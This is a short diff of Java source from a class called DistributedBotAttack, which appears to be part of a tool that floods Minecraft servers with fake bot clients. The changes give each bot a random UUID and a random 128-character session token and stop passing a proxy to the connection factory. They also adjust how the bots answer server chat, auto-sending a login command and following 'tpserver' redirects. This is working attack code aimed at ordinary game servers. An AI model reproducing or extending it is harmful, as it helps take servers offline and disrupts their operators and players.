@@ -13,6 +13,8 @@ import java.util.Random;
 import java.util.Scanner;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+
+import org.spacehq.mc.auth.data.GameProfile;
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
@@ -261,7 +263,9 @@ public class DistributedBotAttack extends IAttack {
 	}
 
 	public Client createClient(final String ip, int port, final String username, Proxy proxy) {
-		Client client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
+		GameProfile profile = new GameProfile(UUID.randomUUID(), username);
+		Client client = new Client(ip, port, new MinecraftProtocol(profile, Utils.getRandomString(128, 128)),
+				new TcpSessionFactory());
 		new MCForge(client.getSession(), this.modList).init();
 		client.getSession().addListener(new SessionListener() {
 			public void packetReceived(PacketReceivedEvent e) {
@@ -287,7 +291,7 @@ public class DistributedBotAttack extends IAttack {
 						client.getSession().send(new ClientChatPacket("/l 123123"));
 					}
 
-					if (message.contains("tpserver")) {
+					if (message.contains("tpserver") && !message.contains(name)) {
 						client.getSession().send(new ClientChatPacket("/tpserver " + gethh(message)));
 
 					}
